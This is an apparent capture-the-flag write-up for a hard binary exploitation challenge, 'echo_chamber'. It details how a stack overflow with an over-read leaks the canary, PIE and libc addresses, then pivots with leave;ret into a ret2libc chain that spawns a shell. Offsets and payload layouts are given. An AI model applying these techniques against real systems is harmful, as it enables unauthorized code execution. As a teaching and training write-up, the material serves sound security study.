### echo_chamber

> Pwn · Hard · Iulian Schifirnet
> Points at solve: [fill in]

**Tools used**

Disassembler; local verification with the provided `ld-linux` + `libc.so.6`.

**Approach**

Target: <instance>
Binary protections: PIE, full RELRO, NX, stack canary (`-fstack-protector-strong`).

The bug:

```c
char buf[0x50];
for (;;) {
    read(0, buf, 0x70);          // 0x20-byte overflow
    if (!strncmp(buf, "bye", 3)) break;
    printf("echo: %s\n", buf);   // over-read until NUL
}
```

`read()` is 0x70 into a 0x50 buffer, and the echo prints the buffer as a C string, so anything we don't overwrite is disclosed until the next NUL. Disassembly gives the exact frame:

| offset from `buf` | contents | read reaches |
|---|---|---|
| 0x00–0x4f | `buf[0x50]` | 0x6f |
| 0x50–0x57 | padding | |
| 0x58–0x5f | stack canary | |
| 0x60–0x67 | saved rbp | |
| 0x68–0x6f | return address | |

The 0x70-byte read overwrites the canary, saved rbp and the return address — but nothing after it, so a plain ret2libc chain doesn't fit. Use a `leave; ret` stack pivot.

Leaks:

1. **Canary + stack.** Send `0x58 * 'A' + 'B'` (0x59 bytes). The single 'B' replaces the canary's 0x00 LSB, so `printf("%s")` runs past it and prints canary bytes 1–7 and the saved rbp. `buf = main_rbp - 0x70` (chamber's frame is `main_rbp - 0x60`).
2. **PIE.** Send `0x58 * 'A' + 8 * 0x43 + 8 * 0x44` (0x68 bytes; fake canary and saved rbp, real return address untouched). The echo continues to the real return address `main+0x137e` → PIE base. (No need to leave the loop; a truncated leak is retried on a fresh connection.)
3. **libc.** Pivot once: payload starts with `bye` to break the loop, restores the canary at 0x58, sets saved rbp = `buf+0x10` and the return address to `leave;ret` (`PIE+0x1365`). The post-pivot chain runs `pop rbp; ret` → `rbp = main_rbp+0x68`, then jumps to the `printf` gadget at `PIE+0x1332`:
   `lea rax,[rbp-0x60]; mov rsi,rax; mov rdi,"echo: %s\n"; call printf`.
   With that rbp, `rbp-0x60 = main_rbp+8` — main's return address into `__libc_start_call_main` (`libc+0x29d90`) is printed. The gadget then falls through into the loop's `read(0, rbp-0x60, 0x70)`, i.e. into writable stack at `main_rbp+8`, so the process survives for the final stage.

Final stage. Send a 0x70-byte second-stage payload (read at `main_rbp+8`, fake frame at `rbp = main_rbp+0x68`):

```
[0x00] "bye"                         -> break + canary check with [rbp-8]
[0x10] ret                           -> stack alignment
[0x18] pop rdi; ret                  -> libc+0x2a3e5
[0x20] "/bin/sh"                     -> libc+0x1d8678
[0x28] system                        -> libc+0x50d70
[0x58] real canary
[0x60] main_rbp+0x10                 -> pivot target
[0x68] leave; ret                    -> PIE+0x1365
```

`leave` pops the fake frame, the second `leave;ret` pivots into the chain inside the payload, and `system("/bin/sh")` spawns the shell. The service runs from `/`, where `/flag` symlinks to `/tmp/flag`; `cat /flag` returns the flag.

**Why it works**

The mismatch between a 0x70-byte `read` and a 0x50-byte buffer gives a linear overflow past the padding into the canary, saved rbp and the return address, while the C-string echo discloses anything beyond the written bytes up to the next NUL. Overwriting only the canary's terminating 0x00 LSB turns the echo into a canary + saved-rbp leak; a frame with a fake canary and fake rbp but a real return address turns it into a PIE leak. Because nothing after 0x6f is controlled, a classic ret2libc chain doesn't fit — instead a `leave; ret` pivot swings `rsp` into attacker-controlled data. The `printf` gadget both leaks a libc return address (into `__libc_start_call_main`) and falls through into a `read` into writable stack, keeping the process alive for a second stage that plants a full ret2libc chain with the restored canary and pivots into it via a second `leave; ret`.

**Validation**

Verified locally with the provided `ld-linux` + `libc.so.6` (return offset 0x29d90) before running against the instance. The same exploit worked on the remote on the first complete leak attempt; `cat /flag` returned the flag (`CSCTF{REDACTED}`).
